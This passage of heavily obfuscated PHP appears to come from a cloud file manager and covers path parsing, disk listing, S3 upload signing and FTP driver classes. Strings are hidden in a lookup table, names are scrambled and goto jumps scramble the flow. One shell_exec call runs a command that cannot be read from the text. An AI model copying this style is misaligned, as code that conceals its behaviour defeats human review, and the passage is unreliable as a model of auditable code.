self::pathHistory($÷çÌ±–ô); $ĞõİÓæã = array($åí‡öÃµ[1289] => $êËıª÷Ş . $åí‡öÃµ[1276], $åí‡öÃµ[1288] => rtrim(get_path_father($êËıª÷Ş), $åí‡öÃµ[8]) . $åí‡öÃµ[8], $åí‡öÃµ[398] => array()); $‹ÅÍêîñ = IO::getContent($ĞõİÓæã[$åí‡öÃµ[1289]]); if ($‹ÅÍêîñ) { $Õ­•úğ = json_decode($‹ÅÍêîñ, !0); if (is_array($Õ­•úğ)) { $ĞõİÓæã[$åí‡öÃµ[398]] = $Õ­•úğ; } } return $ĞõİÓæã; } private static function saveData($«æÀ¹º, $Øø‡ãâ) { $à§á§¦• =& $_SERVER[…É¦À–]; self::log($à§á§¦•[1292] . $«æÀ¹º . $à§á§¦•[71] . count($Øø‡ãâ), $à§á§¦•[791]); if ($Øø‡ãâ) { return IO::setContent($«æÀ¹º, json_encode($Øø‡ãâ)); } $şöİ‘‘Ä = IO::pathFather($«æÀ¹º); IO::remove($«æÀ¹º); self::clearEmptyFolder($şöİ‘‘Ä); return !0; } public static function clearEmptyFolder($°ƒÎÙÜ¾) { $êÖÀôé‚ =& $_SERVER[…É¦À–]; if (trim($°ƒÎÙÜ¾, $êÖÀôé‚[8]) == trim(self::$_historyBase, $êÖÀôé‚[8])) { return; } $Üœ¸¬Ñ = IO::pathFather($°ƒÎÙÜ¾); $÷§˜˜»à = IO::has($°ƒÎÙÜ¾, !0); if ($÷§˜˜»à[$êÖÀôé‚[207]] > 0 || $÷§˜˜»à[$êÖÀôé‚[208]] > 0) { return; } IO::remove($°ƒÎÙÜ¾); self::clearEmptyFolder($Üœ¸¬Ñ); } private static function getBasePath() { $®Ôô÷œ¡ =& $_SERVER[…É¦À–]; $Ëıöü€ = Model($®Ôô÷œ¡[1293])->get($®Ôô÷œ¡[1294]); if ($Ëıöü€) { if (!IO::exist($Ëıöü€)) { IO::mkdir($Ëıöü€); } if (get_path_this($Ëıöü€) == $®Ôô÷œ¡[1279]) { $ ìéíµÖ = $®Ôô÷œ¡[1295] . rand_string(8); @rename($Ëıöü€, get_path_father($Ëıöü€) . $®Ôô÷œ¡[8] . $ ìéíµÖ); $Ëıöü€ = DATA_PATH . $ ìéíµÖ . $®Ôô÷œ¡[8]; file_put_contents(DATA_PATH . $®Ôô÷œ¡[1229], $®Ôô÷œ¡[12]); Model($®Ôô÷œ¡[1293])->set($®Ôô÷œ¡[1294], $Ëıöü€); } return $Ëıöü€; } $Ëıöü€ = DATA_PATH . $®Ôô÷œ¡[1295] . rand_string(8) . $®Ôô÷œ¡[8]; $Ëıöü€ = IO::mkdir($Ëıöü€); $Ëıöü€ = rtrim($Ëıöü€, $®Ôô÷œ¡[8]) . $®Ôô÷œ¡[8]; file_put_contents($Ëıöü€ . $®Ôô÷œ¡[1229], $®Ôô÷œ¡[12]); file_put_contents(DATA_PATH . $®Ôô÷œ¡[1229], $®Ôô÷œ¡[12]); Model($®Ôô÷œ¡[1293])->set($®Ôô÷œ¡[1294], $Ëıöü€); return $Ëıöü€; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\162\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\162\x52\x65\143\171\x63\154\145\175"; const KOD_USER_FAV = "\173\165\163\x65\162\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\162\x46\151\x6c\145\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\162\x46\151\154\x65\124\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\165\160\x52\x6f\x6f\x74\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\123\150\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\x72\123\x68\141\x72\x65\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\162\145\x54\157\115\x65\175"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\162\x65\111\164\x65\155\x7d"; const KOD_SHARE_LINK = "\173\163\x68\x61\162\x65\x49\x74\x65\x6d\114\151\x6e\153\175"; const KOD_SEARCH = "\x7b\x73\x65\141\162\143\150\175"; const KOD_BLOCK = "\x7b\142\154\157\x63\x6b\x7d"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\163\145\162\x52\145\x6e\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\166\x65\x72\x7d"; public static function typeList() { $«Ä¹êº™ =& $_SERVER[…É¦À–]; return array($«Ä¹êº™[1296] => self::KOD_SOURCE, $«Ä¹êº™[1297] => self::KOD_USER_RECYCLE, $«Ä¹êº™[1298] => self::KOD_USER_FAV, $«Ä¹êº™[1299] => self::KOD_USER_FILE_TAG, $«Ä¹êº™[1300] => self::KOD_USER_FILE_TYPE, $«Ä¹êº™[1301] => self::KOD_GROUP_ROOT_SELF, $«Ä¹êº™[1302] => self::KOD_USER_SHARE, $«Ä¹êº™[1303] => self::KOD_USER_SHARE_LINK, $«Ä¹êº™[1304] => self::KOD_USER_SHARE_TO_ME, $«Ä¹êº™[1305] => self::KOD_SHARE_ITEM, $«Ä¹êº™[1306] => self::KOD_SHARE_LINK, $«Ä¹êº™[1307] => self::KOD_SEARCH, $«Ä¹êº™[1308] => self::KOD_BLOCK, $«Ä¹êº™[1309] => self::KOD_IO, $«Ä¹êº™[1310] => self::KOD_USER_RECENT, $«Ä¹êº™[1311] => self::KOD_USER_DRIVER); } public static function parse($–¢ùÊğ¿) { $û¿ôä˜¼ =& $_SERVER[…É¦À–]; $–¢ùÊğ¿ = self::clear($–¢ùÊğ¿); $Ø×ÎåÆø = array_values(self::typeList()); preg_match($û¿ôä˜¼[1312], $–¢ùÊğ¿, $ÚÛîÎ¤ó); $İûÛ³îí = array($û¿ôä˜¼[451] => !1, $û¿ôä˜¼[1313] => !1, $û¿ôä˜¼[448] => !1, $û¿ôä˜¼[84] => $–¢ùÊğ¿, $û¿ôä˜¼[1214] => !1, $û¿ôä˜¼[1213] => $û¿ôä˜¼[12]); if (is_array($ÚÛîÎ¤ó) && count($ÚÛîÎ¤ó) == 5) { $‹öö¡ı = $û¿ôä˜¼[1314] . $ÚÛîÎ¤ó[2] . $û¿ôä˜¼[356]; if (in_array($‹öö¡ı, $Ø×ÎåÆø)) { $İûÛ³îí[$û¿ôä˜¼[1214]] = $ÚÛîÎ¤ó[1]; $İûÛ³îí[$û¿ôä˜¼[33]] = $‹öö¡ı; $İûÛ³îí[$û¿ôä˜¼[1315]] = substr($‹öö¡ı, 1, -1); $İûÛ³îí[$û¿ôä˜¼[428]] = $ÚÛîÎ¤ó[3]; } $İûÛ³îí[$û¿ôä˜¼[1213]] = $ÚÛîÎ¤ó[4]; } $ùı›íî‚ = array($û¿ôä˜¼[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $İûÛ³îí[$û¿ôä˜¼[1278]] = in_array($İûÛ³îí[$û¿ôä˜¼[33]], $ùı›íî‚); return $İûÛ³îí; } public static function isTruePath($æ ô£Âü) { $û³˜‹ïµ =& $_SERVER[…É¦À–]; if (substr($æ ô£Âü, 0, 1) != $û³˜‹ïµ[1314]) { return !0; } if (strpos($æ ô£Âü, $û³˜‹ïµ[437]) === 0) { return !0; } if (strpos($æ ô£Âü, $û³˜‹ïµ[1282]) === 0) { return !0; } if (strpos($æ ô£Âü, $û³˜‹ïµ[1316]) === 0) { return !0; } if (strpos($æ ô£Âü, $û³˜‹ïµ[1317]) === 0) { return !0; } if (strpos($æ ô£Âü, $û³˜‹ïµ[1318]) === 0) { return !0; } return !1; } public static function clear($úàôÄÍ¶) { $˜±’–ŠÛ =& $_SERVER[…É¦À–]; $úàôÄÍ¶ = str_replace(array($˜±’–ŠÛ[1123], $˜±’–ŠÛ[231]), $˜±’–ŠÛ[53], $úàôÄÍ¶); $úàôÄÍ¶ = str_replace($˜±’–ŠÛ[97], $˜±’–ŠÛ[8], $úàôÄÍ¶); $øÀõµ½æ = $˜±’–ŠÛ[1319]; if (substr($úàôÄÍ¶, 0, 3) == $˜±’–ŠÛ[1320]) { $úàôÄÍ¶ = substr($úàôÄÍ¶, 3); } while (strstr($úàôÄÍ¶, $øÀõµ½æ)) { $úàôÄÍ¶ = str_replace($øÀõµ½æ, $˜±’–ŠÛ[8], $úàôÄÍ¶); } $úàôÄÍ¶ = preg_replace($˜±’–ŠÛ[1321], $˜±’–ŠÛ[8], $úàôÄÍ¶); if ($úàôÄÍ¶ == $˜±’–ŠÛ[8]) { return $˜±’–ŠÛ[8]; } $úàôÄÍ¶ = rtrim($úàôÄÍ¶, $˜±’–ŠÛ[8]); return $úàôÄÍ¶; } public static function pathTrue($±¾¦úÆ÷) { $ÜÇ³Ä° =& $_SERVER[…É¦À–]; if (!$±¾¦úÆ÷) { return $ÜÇ³Ä°[12]; } $´¸òƒ  = strlen($±¾¦úÆ÷); if (substr($±¾¦úÆ÷, $´¸òƒ  - 1, 1) == $ÜÇ³Ä°[8]) { $±¾¦úÆ÷ = substr($±¾¦úÆ÷, 0, $´¸òƒ  - 1); } $±¾¦úÆ÷ = str_replace($ÜÇ³Ä°[548], $ÜÇ³Ä°[8], str_replace($ÜÇ³Ä°[1322], $ÜÇ³Ä°[8], $±¾¦úÆ÷)); if (substr($±¾¦úÆ÷, 0, 2) == $ÜÇ³Ä°[1323]) { $±¾¦úÆ÷ = substr($±¾¦úÆ÷, 2); } if (!strstr($±¾¦úÆ÷, $ÜÇ³Ä°[1320])) { return $±¾¦úÆ÷; } $ŒÅğ¡—¨ = explode($ÜÇ³Ä°[8], $±¾¦úÆ÷); $³ÁŒ¯³Ô = array_search($ÜÇ³Ä°[1324], $ŒÅğ¡—¨); if ($³ÁŒ¯³Ô >= 0) { $ŒÅğ¡—¨[$³ÁŒ¯³Ô] = -1; } if ($³ÁŒ¯³Ô > 0) { $ŒÅğ¡—¨[$³ÁŒ¯³Ô - 1] = -1; } $Æ†©´° = array(); foreach ($ŒÅğ¡—¨ as $Æ“À†’·) { if ($Æ“À†’· !== -1) { $Æ†©´°[] = $Æ“À†’·; } } return self::pathTrue(implode($ÜÇ³Ä°[8], $Æ†©´°)); } public static function sourceID($ÆâƒÛƒç) { $´À÷ =& $_SERVER[…É¦À–]; $¯Ì¨¹İ¨ = self::parse($ÆâƒÛƒç); if ($¯Ì¨¹İ¨[$´À÷[33]] !== self::KOD_SOURCE) { show_json(LNG($´À÷[1325]), !1); } return $¯Ì¨¹İ¨[$´À÷[428]]; } public static function make($÷ÉÈ²ë) { if (!$÷ÉÈ²ë) { return !1; } return self::makePath(self::KOD_SOURCE, intval($÷ÉÈ²ë)); } public static function makeShare($™Úé’‘, $ ®ÏûÈÍ) { return self::makePath(self::KOD_SHARE_ITEM, $™Úé’‘, $ ®ÏûÈÍ); } public static function makeFileTypePath($¥éÑ÷Íº) { return self::makePath(self::KOD_USER_FILE_TYPE, $¥éÑ÷Íº); } public static function makeFileTagPath($¹ãÊ†Ãä) { return self::makePath(self::KOD_USER_FILE_TAG, $¹ãÊ†Ãä); } public static function makePath($Ï ş€œÎ, $ÄàäŸ´à = '', $´Ì½‹í² = '') { $×Î‚ÕÏ =& $_SERVER[…É¦À–]; $û‡¿Ü¦· = substr($Ï ş€œÎ, 1, -1); $İ×ìâ’‚ = $×Î‚ÕÏ[1326] . $û‡¿Ü¦· . $×Î‚ÕÏ[1327] . $ÄàäŸ´à . $×Î‚ÕÏ[1328]; $İ×ìâ’‚ = $´Ì½‹í² ? $İ×ìâ’‚ . $´Ì½‹í² . $×Î‚ÕÏ[8] : $İ×ìâ’‚; return $İ×ìâ’‚; } public static function hashPath($í×áúñã, $ßÊôê‚— = true) { $Ğ«£ÏûÓ =& $_SERVER[…É¦À–]; $Û‹ìµ å = is_array($í×áúñã) ? $í×áúñã : IO::info($í×áúñã); $Ø×Ü”ù = _get($Û‹ìµ å, $Ğ«£ÏûÓ[1329], $Ğ«£ÏûÓ[12]); if (!$Ø×Ü”ù && isset($Û‹ìµ å[$Ğ«£ÏûÓ[431]])) { $Û‹ìµ å = IO::info(KodIO::make($Û‹ìµ å[$Ğ«£ÏûÓ[431]])); $Ø×Ü”ù = _get($Û‹ìµ å, $Ğ«£ÏûÓ[1329], $Ğ«£ÏûÓ[12]); } if (!$Ø×Ü”ù && $ßÊôê‚—) { $ã†Ê„ì¦ = KodIO::parse($Û‹ìµ å[$Ğ«£ÏûÓ[84]]); if (!$ã†Ê„ì¦[$Ğ«£ÏûÓ[33]]) { $Ø×Ü”ù = IO::hashSimple($Û‹ìµ å[$Ğ«£ÏûÓ[84]]); } } if (!$Ø×Ü”ù) { $Ø×Ü”ù = md5($Û‹ìµ å[$Ğ«£ÏûÓ[84]] . $Û‹ìµ å[$Ğ«£ÏûÓ[76]] . $Û‹ìµ å[$Ğ«£ÏûÓ[85]]); } return $Ø×Ü”ù; } public static function hashPathSafe($ö±‚š¹•, $¬åÕ•™ = true) { $¦ßÚ¶Š‚ =& $_SERVER[…É¦À–]; $»õÔ¹éˆ = self::hashPath($ö±‚š¹•, $¬åÕ•™); return md5($»õÔ¹éˆ . $¦ßÚ¶Š‚[1330] . Model($¦ßÚ¶Š‚[810])->get($¦ßÚ¶Š‚[811])); } public static function initSystemPath() { $’‰Æ‹Ò =& $_SERVER[…É¦À–]; if (defined($’‰Æ‹Ò[1331])) { return; } define($’‰Æ‹Ò[1331], self::systemPath($’‰Æ‹Ò[1332])); define($’‰Æ‹Ò[1333], self::systemPath($’‰Æ‹Ò[1334])); define($’‰Æ‹Ò[1335], self::systemPath($’‰Æ‹Ò[1336])); define($’‰Æ‹Ò[1337], self::systemPath($’‰Æ‹Ò[1338])); IOHistory::bindEvent(); } public static function systemPath($É˜£öêø) { $Ã‚›® =& $_SERVER[…É¦À–]; $»ôïœÛ = $Ã‚›®[1339] . ucfirst($É˜£öêø); $ÚöÏ‹ = Model($Ã‚›®[810])->get($»ôïœÛ); if ($ÚöÏ‹) { return $ÚöÏ‹; } if ($É˜£öêø == $Ã‚›®[1332]) { $ÚöÏ‹ = self::make(Model($Ã‚›®[865])->systemRootPathAdd($Ã‚›®[563])); } else { $ÚöÏ‹ = self::systemPath($Ã‚›®[1332]); $Õ™‰ü¦¼ = self::sourceID($ÚöÏ‹); $ÚöÏ‹ = self::make(Model($Ã‚›®[865])->mkdir($Õ™‰ü¦¼, $É˜£öêø)); } Model($Ã‚›®[810])->set($»ôïœÛ, $ÚöÏ‹); return $ÚöÏ‹; } public static function systemFolder($ÙÄ‰–ƒ«) { $¿³¯¦¾Ÿ = IO_PATH_SYSTEM_SOURCE . $ÙÄ‰–ƒ«; $üäí÷ Ê = Cache::get($¿³¯¦¾Ÿ); if (!$üäí÷ Ê) { $æ‰Ô¥Íö = IO::infoFull($¿³¯¦¾Ÿ); if (!$æ‰Ô¥Íö) { $üäí÷ Ê = IO::mkdir($¿³¯¦¾Ÿ, REPEAT_SKIP); } else { $üäí÷ Ê = $æ‰Ô¥Íö[$_SERVER[…É¦À–][84]]; } Cache::set($¿³¯¦¾Ÿ, $üäí÷ Ê, 3600 * 10); } return $üäí÷ Ê; } public static function defaultDriver() { return Model($_SERVER[…É¦À–][807])->defaultDriver(); } public static function defaultIO() { $´¼½˜Á =& $_SERVER[…É¦À–]; $ı±®€Æ¨ = self::defaultDriver(); return $´¼½˜Á[1340] . $ı±®€Æ¨[$´¼½˜Á[428]] . $´¼½˜Á[1328]; } public static function defaultDriverInit() { static $ìôåµğÁ = false; if ($ìôåµğÁ) { return $ìôåµğÁ; } $ìôåµğÁ = IO::init(self::defaultIO()); return $ìôåµğÁ; } public static function fileTypeList() { $„·¥ƒöÁ =& $_SERVER[…É¦À–]; $ÃË¥©Û = $GLOBALS[$„·¥ƒöÁ[6]][$„·¥ƒöÁ[1341]]; foreach ($ÃË¥©Û as $ÍŞ÷ßÍ– => $µØæ»ì¸) { $„«¢ı’ = $„·¥ƒöÁ[1342] . $ÍŞ÷ßÍ–; $²ëîÕ§Ï = LNG($„«¢ı’); if ($„«¢ı’ != $²ëîÕ§Ï) { $ÃË¥©Û[$ÍŞ÷ßÍ–][$„·¥ƒöÁ[32]] = $²ëîÕ§Ï; } } return $ÃË¥©Û; } public static function diskList($çàâé¬ = true) { $¹ò¨ÍäŸ = $_SERVER[…É¦À–][1343]; if ($çàâé¬) { $ïÆøØÚ± = Cache::get($¹ò¨ÍäŸ); if (is_array($ïÆøØÚ±)) { return $ïÆøØÚ±; } } $ïÆøØÚ± = self::diskListGet(); Cache::set($¹ò¨ÍäŸ, $ïÆøØÚ±, 60); return $ïÆøØÚ±; } public static function diskListGet() { $à©öÆåÃ =& $_SERVER[…É¦À–]; $àß¢ºˆÛ = array(); if ($GLOBALS[$à©öÆåÃ[6]][$à©öÆåÃ[1344]] == $à©öÆåÃ[1345]) { $Áİèæµ÷ = $à©öÆåÃ[1346]; for ($Ì¬¯ŸŸ· = 0; $Ì¬¯ŸŸ· < strlen($Áİèæµ÷); $Ì¬¯ŸŸ·++) { $Ú‹¸ŒËĞ = $Áİèæµ÷[$Ì¬¯ŸŸ·] . $à©öÆåÃ[1347]; if (file_exists($Ú‹¸ŒËĞ)) { $àß¢ºˆÛ[] = $Ú‹¸ŒËĞ; } } return $àß¢ºˆÛ; } if (!function_exists($à©öÆåÃ[98])) { $àß¢ºˆÛ[] = $à©öÆåÃ[875]; return $àß¢ºˆÛ; } $ôÔÎ·œŒ = explode($à©öÆåÃ[231], shell_exec($à©öÆåÃ[1348])); array_shift($ôÔÎ·œŒ); array_pop($ôÔÎ·œŒ); $ó¢©ªšª = array($à©öÆåÃ[1349], $à©öÆåÃ[1350], $à©öÆåÃ[1351], $à©öÆåÃ[1352], $à©öÆåÃ[1353], $à©öÆåÃ[1354], $à©öÆåÃ[1355], $à©öÆåÃ[1356]); foreach ($ôÔÎ·œŒ as $Œ÷ê¹ğÀ) { $îº¤˜¥‚ = preg_split($à©öÆåÃ[1357], $Œ÷ê¹ğÀ); $Ú‹¸ŒËĞ = $îº¤˜¥‚[count($îº¤˜¥‚) - 1]; if (!strstr($îº¤˜¥‚[0], $à©öÆåÃ[1358]) || !$Ú‹¸ŒËĞ) { continue; } $›É÷Ö¾Š = rtrim($Ú‹¸ŒËĞ, $à©öÆåÃ[8]) . $à©öÆåÃ[8]; if (in_array($›É÷Ö¾Š, $ó¢©ªšª)) { continue; } $àß¢ºˆÛ[] = $›É÷Ö¾Š; } return $àß¢ºˆÛ; } public static function isSameDisk($¦¡ÇÛÀí, $ùÁ™Î ) { $Ç›“ú­… =& $_SERVER[…É¦À–]; if ($GLOBALS[$Ç›“ú­…[6]][$Ç›“ú­…[1344]] == $Ç›“ú­…[1345]) { return strtolower(substr($¦¡ÇÛÀí, 0, 1)) == strtolower(substr($ùÁ™Î , 0, 1)); } $¹ŒŠŸ™ö = self::diskList(); $Ãµ“Œœ½ = !1; $ø“À‡Ï† = !1; sort($¹ŒŠŸ™ö); $¹ŒŠŸ™ö = array_reverse($¹ŒŠŸ™ö); $¦¡ÇÛÀí = rtrim($¦¡ÇÛÀí, $Ç›“ú­…[8]) . $Ç›“ú­…[8]; $ùÁ™Î  = rtrim($ùÁ™Î , $Ç›“ú­…[8]) . $Ç›“ú­…[8]; foreach ($¹ŒŠŸ™ö as $ Ÿ»€) { $Ââ¡úßı = strlen($ Ÿ»€); if (!$Ãµ“Œœ½ && substr($¦¡ÇÛÀí, 0, $Ââ¡úßı) == $ Ÿ»€) { $Ãµ“Œœ½ = $ Ÿ»€; } if (!$ø“À‡Ï† && substr($ùÁ™Î , 0, $Ââ¡úßı) == $ Ÿ»€) { $ø“À‡Ï† = $ Ÿ»€; } if ($Ãµ“Œœ½ && $ø“À‡Ï†) { break; } } return $Ãµ“Œœ½ === $ø“À‡Ï†; } public static function transferType($¶†ÁƒŞ, $šÛ€ÉÆŒ) { $§½Çõ’ =& $_SERVER[…É¦À–]; $ÅÕ¶İ¹Û = self::driverType($¶†ÁƒŞ); $¬µ‘ø¡Ò = self::driverType($šÛ€ÉÆŒ); if ($ÅÕ¶İ¹Û[$§½Çõ’[33]] == $¬µ‘ø¡Ò[$§½Çõ’[33]] && $ÅÕ¶İ¹Û[$§½Çõ’[1359]] == $¬µ‘ø¡Ò[$§½Çõ’[1359]]) { return $§½Çõ’[1360]; } if ($ÅÕ¶İ¹Û[$§½Çõ’[33]] == $§½Çõ’[908] && $¬µ‘ø¡Ò[$§½Çõ’[33]] == $§½Çõ’[106]) { return $§½Çõ’[1239]; } if ($ÅÕ¶İ¹Û[$§½Çõ’[33]] == $§½Çõ’[106] && $¬µ‘ø¡Ò[$§½Çõ’[33]] == $§½Çõ’[908]) { return $§½Çõ’[107]; } return $§½Çõ’[1361]; } public static function driverType($–º½‚˜Ä) { $¶ÂÀ·ğ» =& $_SERVER[…É¦À–]; $Ôåê­›Ë = str_replace($¶ÂÀ·ğ»[1362], $¶ÂÀ·ğ»[12], strtolower($–º½‚˜Ä->getType())); if ($Ôåê­›Ë == $¶ÂÀ·ğ»[797] || $Ôåê­›Ë == $¶ÂÀ·ğ»[1363] || $Ôåê­›Ë == $¶ÂÀ·ğ»[1364]) { $–º½‚˜Ä = self::defaultDriverInit(); } else { if ($Ôåê­›Ë == $¶ÂÀ·ğ»[1249] || $Ôåê­›Ë == $¶ÂÀ·ğ»[1365]) { $–º½‚˜Ä = IO::init($–º½‚˜Ä->pathParse[$¶ÂÀ·ğ»[1196]]); } } $ÆÄ¢ò¦× = $–º½‚˜Ä->path; $Ôåê­›Ë = str_replace($¶ÂÀ·ğ»[1362], $¶ÂÀ·ğ»[12], strtolower($–º½‚˜Ä->getType())); if ($Ôåê­›Ë == $¶ÂÀ·ğ»[106]) { return array($¶ÂÀ·ğ»[33] => $¶ÂÀ·ğ»[106], $¶ÂÀ·ğ»[1359] => $¶ÂÀ·ğ»[12], $¶ÂÀ·ğ»[84] => $ÆÄ¢ò¦×, $¶ÂÀ·ğ»[95] => $–º½‚˜Ä); } return array($¶ÂÀ·ğ»[33] => $¶ÂÀ·ğ»[908], $¶ÂÀ·ğ»[1359] => $–º½‚˜Ä->pathDriver, $¶ÂÀ·ğ»[84] => $ÆÄ¢ò¦×, $¶ÂÀ·ğ»[95] => $–º½‚˜Ä); } public static function pathDriverType($ô¢¸§Ç®) { return $ô¢¸§Ç® ? self::driverType(IO::init($ô¢¸§Ç®)) : !1; } public static function pathDriverLocal($†ÚØÆÄñ) { $ÙíĞØŞ¦ =& $_SERVER[…É¦À–]; $ùéâÈŒè = $†ÚØÆÄñ ? self::driverType(IO::init($†ÚØÆÄñ)) : !1; return $ùéâÈŒè[$ÙíĞØŞ¦[33]] == $ÙíĞØŞ¦[106] ? !0 : !1; } public static function allowCover($—¾‘¤¾‰, $¿”İ‘¸˜ = true) { $¥íïªÉ¦ =& $_SERVER[…É¦À–]; if (is_string($—¾‘¤¾‰)) { $—¾‘¤¾‰ = IO::info($—¾‘¤¾‰); } if (!$—¾‘¤¾‰ || $—¾‘¤¾‰[$¥íïªÉ¦[33]] == $¥íïªÉ¦[75] || $—¾‘¤¾‰[$¥íïªÉ¦[76]] <= 100) { return !1; } if (isset($—¾‘¤¾‰[$¥íïªÉ¦[1366]]) || !$—¾‘¤¾‰[$¥íïªÉ¦[84]]) { return !1; } if (isset($—¾‘¤¾‰[$¥íïªÉ¦[202]]) && !$—¾‘¤¾‰[$¥íïªÉ¦[202]]) { return $—¾‘¤¾‰; } static $óÎÇ½Õö = false; if (!$óÎÇ½Õö || !$¿”İ‘¸˜) { $ÓÂŠÃ“— = self::driverType(IO::init($—¾‘¤¾‰[$¥íïªÉ¦[84]])); $àÉ»€ôê = $ÓÂŠÃ“—[$¥íïªÉ¦[95]]; $óÎÇ½Õö = $¥íïªÉ¦[1367]; if ($ÓÂŠÃ“—[$¥íïªÉ¦[33]] == $¥íïªÉ¦[106]) { $óÎÇ½Õö = $¥íïªÉ¦[1368]; } if ($ÓÂŠÃ“—[$¥íïªÉ¦[95]] && is_array($ÓÂŠÃ“—[$¥íïªÉ¦[95]]->config)) { $ş³ªÛ = $ÓÂŠÃ“—[$¥íïªÉ¦[95]]->config; if (isset($ş³ªÛ[$¥íïªÉ¦[1369]]) && $ş³ªÛ[$¥íïªÉ¦[1369]]) { $óÎÇ½Õö = $¥íïªÉ¦[1368]; } } } return $óÎÇ½Õö == $¥íïªÉ¦[1368] ? !0 : !1; } } goto B‹ùÅœÓôß; b™ Ú¬ùã•: define($_SERVER[…É¦À–][633], $_SERVER[…É¦À–][634]); $vloqiycwdp = $_SERVER[…É¦À–][635]; while (strlen($vloqiycwdp) < $_SERVER[…É¦À–][636]) { if (!$vloqiycwdp) { break; } $vloqiycwdp++; } goto f¯ÄÚ™Å¼¢; fê¥Ï›È: class PathDriverEDS extends PathDriverMinIO { public function __construct($Ï¡ò‚ÁÎ) { parent::__construct($Ï¡ò‚ÁÎ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($’«¦•İ) { parent::__construct($’«¦•İ); $this->signatureVersion($_SERVER[…É¦À–][216]); } public function uploadFormData($ŒİÆıé‹, $íûşñâë = 3600) { $ç£É•¢Ë =& $_SERVER[…É¦À–]; $•ŒŞ±‘« = $ç£É•¢Ë[199]; $•ó¹ô¨  = $ç£É•¢Ë[238]; $ª€®Æ¹ô = $ç£É•¢Ë[62]; $òœöÄƒ‡ = gmdate($ç£É•¢Ë[239]); $Á¢ÍË±˜ = gmdate($ç£É•¢Ë[240]); $’ó±“…Ÿ = $ç£É•¢Ë[241]; $‹Óê­² = $íûşñâë . $ç£É•¢Ë[12]; $×–ƒ’Ïé = $ç£É•¢Ë[242]; $ÑÚ“…îõ = array($this->accessKey, $Á¢ÍË±˜, $this->region, $ª€®Æ¹ô, $’ó±“…Ÿ); $â‹¯Ã‹ğ = implode($ç£É•¢Ë[8], $ÑÚ“…îõ); $ÍŒÔÒ ¿ = array($ç£É•¢Ë[243] => gmdate($ç£É•¢Ë[1370], strtotime($ç£É•¢Ë[245])), $ç£É•¢Ë[246] => array(array($ç£É•¢Ë[247] => $this->bucket), array($ç£É•¢Ë[248] => $•ŒŞ±‘«), array($ç£É•¢Ë[249], $ç£É•¢Ë[250], $ç£É•¢Ë[12]), array($ç£É•¢Ë[249], $ç£É•¢Ë[251], $ç£É•¢Ë[12]), array($ç£É•¢Ë[249], $ç£É•¢Ë[252], $ç£É•¢Ë[12]), array($ç£É•¢Ë[253] => $×–ƒ’Ïé), array($ç£É•¢Ë[254] => $â‹¯Ã‹ğ), array($ç£É•¢Ë[255] => $•ó¹ô¨ ), array($ç£É•¢Ë[256] => $òœöÄƒ‡), array($ç£É•¢Ë[257] => $‹Óê­²))); $ôúİù´‘ = base64_encode(json_encode($ÍŒÔÒ ¿)); $¤¬˜©„† = hash_hmac($ç£É•¢Ë[258], $Á¢ÍË±˜, $ç£É•¢Ë[259] . $this->secret, !0); $ã±Œüñõ = hash_hmac($ç£É•¢Ë[258], $this->region, $¤¬˜©„†, !0); $½ÊüÎ = hash_hmac($ç£É•¢Ë[258], $ª€®Æ¹ô, $ã±Œüñõ, !0); $Ñ«­¥¦ = hash_hmac($ç£É•¢Ë[258], $’ó±“…Ÿ, $½ÊüÎ, !0); $Ã­£üŒü = hash_hmac($ç£É•¢Ë[258], $ôúİù´‘, $Ñ«­¥¦); $‡¼ŠõÓñ = array($ç£É•¢Ë[215] => $ç£É•¢Ë[12], $ç£É•¢Ë[260] => $ç£É•¢Ë[12], $ç£É•¢Ë[248] => $•ŒŞ±‘«, $ç£É•¢Ë[253] => $×–ƒ’Ïé, $ç£É•¢Ë[261] => $ôúİù´‘, $ç£É•¢Ë[262] => $â‹¯Ã‹ğ, $ç£É•¢Ë[263] => $•ó¹ô¨ , $ç£É•¢Ë[264] => $òœöÄƒ‡, $ç£É•¢Ë[265] => $‹Óê­², $ç£É•¢Ë[266] => $Ã­£üŒü, $ç£É•¢Ë[182] => $this->getHost()); return $‡¼ŠõÓñ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($±Ö¢¯ó÷) { parent::__construct(); if (count($±Ö¢¯ó÷) > 0) { $this->_init($±Ö¢¯ó÷); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Üù¾œá½) { $¤Ä…º¤ü =& $_SERVER[…É¦À–]; global $config; $this->appCharset = $config[$¤Ä…º¤ü[1397]]; $this->systemCharset = $config[$¤Ä…º¤ü[1398]]; if (isset($Üù¾œá½[$¤Ä…º¤ü[1399]]) && $Üù¾œá½[$¤Ä…º¤ü[1399]]) { $this->systemCharset = $Üù¾œá½[$¤Ä…º¤ü[1399]]; } } public function iconvApp($Äºƒª«·) { return $this->iconvTo($Äºƒª«·, $this->systemCharset, $this->appCharset); } public function iconvSystem($±¿ÌñŠ²) { return $this->iconvTo($±¿ÌñŠ², $this->appCharset, $this->systemCharset); } public function getPathOuter($¹“´™Á) { $ç¦”¾¯“ =& $_SERVER[…É¦À–]; $È¼Éµ„ = $this->iconvApp($this->pathBase); $¹“´™Á = $this->iconvApp($¹“´™Á); if (substr($È¼Éµ„, 0, 2) == $ç¦”¾¯“[1323]) { $È¼Éµ„ = BASIC_PATH . substr($È¼Éµ„, 2); } if (substr($¹“´™Á, 0, 2) == $ç¦”¾¯“[1323]) { $¹“´™Á = BASIC_PATH . substr($¹“´™Á, 2); } $È¼Éµ„ = 